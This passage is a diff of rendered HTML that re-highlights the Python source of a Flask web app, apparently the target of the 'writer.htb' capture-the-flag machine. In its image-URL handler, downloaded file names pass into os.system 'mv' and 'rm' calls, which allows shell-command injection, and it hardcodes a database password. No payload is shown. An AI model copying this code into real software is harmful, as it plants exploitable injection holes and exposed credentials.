-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> flask <span style="color:#ff79c6">import</span> Flask, session, redirect, url_for, request, render_template
-<span style="color:#ff79c6">from</span> mysql.connector <span style="color:#ff79c6">import</span> errorcode
-<span style="color:#ff79c6">import</span> mysql.connector
-<span style="color:#ff79c6">import</span> urllib.request
-<span style="color:#ff79c6">import</span> os
-<span style="color:#ff79c6">import</span> PIL
-<span style="color:#ff79c6">from</span> PIL <span style="color:#ff79c6">import</span> Image, UnidentifiedImageError
-<span style="color:#ff79c6">import</span> hashlib
-
-app <span style="color:#ff79c6">=</span> Flask(__name__,static_url_path<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;&#39;</span>,static_folder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;static&#39;</span>,template_folder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;templates&#39;</span>)
-
-<span style="color:#6272a4">#Define connection for database</span>
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">connections</span>():
-    <span style="color:#ff79c6">try</span>:
-        connector <span style="color:#ff79c6">=</span> mysql<span style="color:#ff79c6">.</span>connector<span style="color:#ff79c6">.</span>connect(user<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;admin&#39;</span>, password<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;ToughPasswordToCrack&#39;</span>, host<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, database<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;writer&#39;</span>)
-        <span style="color:#ff79c6">return</span> connector
-    <span style="color:#ff79c6">except</span> mysql<span style="color:#ff79c6">.</span>connector<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> err:
-    [<span style="color:#ff79c6">..</span>snip<span style="color:#ff79c6">..</span>]
-
-@app<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/dashboard/stories/edit/&lt;id&gt;&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
-<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">edit_story</span>(<span style="color:#8be9fd;font-style:italic">id</span>):
-    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> (<span style="color:#f1fa8c">&#39;user&#39;</span> <span style="color:#ff79c6">in</span> session):
-        <span style="color:#ff79c6">return</span> redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)
-    <span style="color:#ff79c6">try</span>:
-        connector <span style="color:#ff79c6">=</span> connections()
-    <span style="color:#ff79c6">except</span> mysql<span style="color:#ff79c6">.</span>connector<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> err:
-            <span style="color:#ff79c6">return</span> (<span style="color:#f1fa8c">&#34;Database error&#34;</span>)
-    <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>method <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;POST&#34;</span>:
-        cursor <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>cursor()
-        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT * FROM stories where id = </span><span style="color:#f1fa8c">%(id)s</span><span style="color:#f1fa8c">;&#34;</span>, {<span style="color:#f1fa8c">&#39;id&#39;</span>: <span style="color:#8be9fd;font-style:italic">id</span>})
-        results <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
-        <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>files[<span style="color:#f1fa8c">&#39;image&#39;</span>]:
-            image <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>files[<span style="color:#f1fa8c">&#39;image&#39;</span>]
-            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;.jpg&#34;</span> <span style="color:#ff79c6">in</span> image<span style="color:#ff79c6">.</span>filename:
-                path <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(<span style="color:#f1fa8c">&#39;/var/www/writer.htb/writer/static/img/&#39;</span>, image<span style="color:#ff79c6">.</span>filename)
-                image<span style="color:#ff79c6">.</span>save(path)
-                image <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/img/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image<span style="color:#ff79c6">.</span>filename)
-                cursor <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>cursor()
-                cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;UPDATE stories SET image = </span><span style="color:#f1fa8c">%(image)s</span><span style="color:#f1fa8c"> WHERE id = </span><span style="color:#f1fa8c">%(id)s</span><span style="color:#f1fa8c">&#34;</span>, {<span style="color:#f1fa8c">&#39;image&#39;</span>:image, <span style="color:#f1fa8c">&#39;id&#39;</span>:<span style="color:#8be9fd;font-style:italic">id</span>})
-                result <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>commit()
-            <span style="color:#ff79c6">else</span>:
-                error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;File extensions must be in .jpg!&#34;</span>
-                <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
-        <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>form<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;image_url&#39;</span>):
-            image_url <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;image_url&#39;</span>)
-            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;.jpg&#34;</span> <span style="color:#ff79c6">in</span> image_url:
-                <span style="color:#ff79c6">try</span>:
-                    local_filename, headers <span style="color:#ff79c6">=</span> urllib<span style="color:#ff79c6">.</span>request<span style="color:#ff79c6">.</span>urlretrieve(image_url)
-                    os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;mv </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c"> </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">.jpg&#34;</span><span style="color:#ff79c6">.</span>format(local_filename, local_filename))
-                    image <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">.jpg&#34;</span><span style="color:#ff79c6">.</span>format(local_filename)
-                    <span style="color:#ff79c6">try</span>:
-                        im <span style="color:#ff79c6">=</span> Image<span style="color:#ff79c6">.</span>open(image)
-                        im<span style="color:#ff79c6">.</span>verify()
-                        im<span style="color:#ff79c6">.</span>close()
-                        image <span style="color:#ff79c6">=</span> image<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#39;/tmp/&#39;</span>,<span style="color:#f1fa8c">&#39;&#39;</span>)
-                        os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;mv /tmp/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c"> /var/www/writer.htb/writer/static/img/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image, image))
-                        image <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/img/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image)
-                        cursor <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>cursor()
-                        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;UPDATE stories SET image = </span><span style="color:#f1fa8c">%(image)s</span><span style="color:#f1fa8c"> WHERE id = </span><span style="color:#f1fa8c">%(id)s</span><span style="color:#f1fa8c">&#34;</span>, {<span style="color:#f1fa8c">&#39;image&#39;</span>:image, <span style="color:#f1fa8c">&#39;id&#39;</span>:<span style="color:#8be9fd;font-style:italic">id</span>})
-                        result <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>commit()
-
-                    <span style="color:#ff79c6">except</span> PIL<span style="color:#ff79c6">.</span>UnidentifiedImageError:
-                        os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;rm </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image))
-                        error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Not a valid image file!&#34;</span>
-                        <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
-                <span style="color:#ff79c6">except</span>:
-                    error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Issue uploading picture&#34;</span>
-                    <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
-            <span style="color:#ff79c6">else</span>:
-                error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;File extensions must be in .jpg!&#34;</span>
-                <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
-
-    [<span style="color:#ff79c6">..</span>snip<span style="color:#ff79c6">..</span>]
-
-<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
-   app<span style="color:#ff79c6">.</span>run(<span style="color:#f1fa8c">&#34;0.0.0.0&#34;</span>)
-</code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> flask <span style="color:#ff79c6">import</span> Flask, session, redirect, url_for, request, render_template
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> mysql.connector <span style="color:#ff79c6">import</span> errorcode
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> mysql.connector
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> urllib.request
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> PIL
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> PIL <span style="color:#ff79c6">import</span> Image, UnidentifiedImageError
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#ff79c6">=</span> Flask(__name__,static_url_path<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;&#39;</span>,static_folder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;static&#39;</span>,template_folder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;templates&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#Define connection for database</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">connections</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
+</span></span><span style="display:flex;"><span>        connector <span style="color:#ff79c6">=</span> mysql<span style="color:#ff79c6">.</span>connector<span style="color:#ff79c6">.</span>connect(user<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;admin&#39;</span>, password<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;ToughPasswordToCrack&#39;</span>, host<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, database<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;writer&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> connector
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> mysql<span style="color:#ff79c6">.</span>connector<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> err:
+</span></span><span style="display:flex;"><span>    [<span style="color:#ff79c6">..</span>snip<span style="color:#ff79c6">..</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@app<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/dashboard/stories/edit/&lt;id&gt;&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">edit_story</span>(<span style="color:#8be9fd;font-style:italic">id</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> (<span style="color:#f1fa8c">&#39;user&#39;</span> <span style="color:#ff79c6">in</span> session):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> redirect(<span style="color:#f1fa8c">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
+</span></span><span style="display:flex;"><span>        connector <span style="color:#ff79c6">=</span> connections()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> mysql<span style="color:#ff79c6">.</span>connector<span style="color:#ff79c6">.</span>Error <span style="color:#ff79c6">as</span> err:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> (<span style="color:#f1fa8c">&#34;Database error&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>method <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;POST&#34;</span>:
+</span></span><span style="display:flex;"><span>        cursor <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>cursor()
+</span></span><span style="display:flex;"><span>        cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;SELECT * FROM stories where id = </span><span style="color:#f1fa8c">%(id)s</span><span style="color:#f1fa8c">;&#34;</span>, {<span style="color:#f1fa8c">&#39;id&#39;</span>: <span style="color:#8be9fd;font-style:italic">id</span>})
+</span></span><span style="display:flex;"><span>        results <span style="color:#ff79c6">=</span> cursor<span style="color:#ff79c6">.</span>fetchall()
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>files[<span style="color:#f1fa8c">&#39;image&#39;</span>]:
+</span></span><span style="display:flex;"><span>            image <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>files[<span style="color:#f1fa8c">&#39;image&#39;</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;.jpg&#34;</span> <span style="color:#ff79c6">in</span> image<span style="color:#ff79c6">.</span>filename:
+</span></span><span style="display:flex;"><span>                path <span style="color:#ff79c6">=</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(<span style="color:#f1fa8c">&#39;/var/www/writer.htb/writer/static/img/&#39;</span>, image<span style="color:#ff79c6">.</span>filename)
+</span></span><span style="display:flex;"><span>                image<span style="color:#ff79c6">.</span>save(path)
+</span></span><span style="display:flex;"><span>                image <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/img/</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(image<span style="color:#ff79c6">.</span>filename)
+</span></span><span style="display:flex;"><span>                cursor <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>cursor()
+</span></span><span style="display:flex;"><span>                cursor<span style="color:#ff79c6">.</span>execute(<span style="color:#f1fa8c">&#34;UPDATE stories SET image = </span><span style="color:#f1fa8c">%(image)s</span><span style="color:#f1fa8c"> WHERE id = </span><span style="color:#f1fa8c">%(id)s</span><span style="color:#f1fa8c">&#34;</span>, {<span style="color:#f1fa8c">&#39;image&#39;</span>:image, <span style="color:#f1fa8c">&#39;id&#39;</span>:<span style="color:#8be9fd;font-style:italic">id</span>})
+</span></span><span style="display:flex;"><span>                result <span style="color:#ff79c6">=</span> connector<span style="color:#ff79c6">.</span>commit()
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>                error <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;File extensions must be in .jpg!&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;edit.html&#39;</span>, error<span style="color:#ff79c6">=</span>error, results<span style="color:#ff79c6">=</span>results, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">id</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>form<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;image_url&#39;</span>):
+</span></span><span style="display:flex;"><span>            image_url <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">&#39;image_url&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;.jpg&#34;</span> <span style="color:#ff79c6">in</span> image_url:
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">try</span>:
+</span></span><span style="display:flex;"><span>                    local_filename, headers <span style="color:#ff79c6">=</span> urllib<span style="color:#ff79c6">.</span>request<span style="color:#ff79c6">.</span>urlretrieve(image_url)
+</span></span><span style="display:flex;"><span>                    os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;mv </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c"> </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">.jpg&#34;</span><span style="color:#ff79c6">.</span>format(local_filename, local_filename))
+</span></span><span style="display:flex;"><span>                    image <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">.jpg&#34;</span><span style="color:#ff79c6">.</span>format(local_filename)
+</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">try</span>:
+</span></span><span style="display:flex;"><span>                        im <span style="color:#ff79c6">=</span> Image<span style="color:#ff79c6">.</span>open(image)
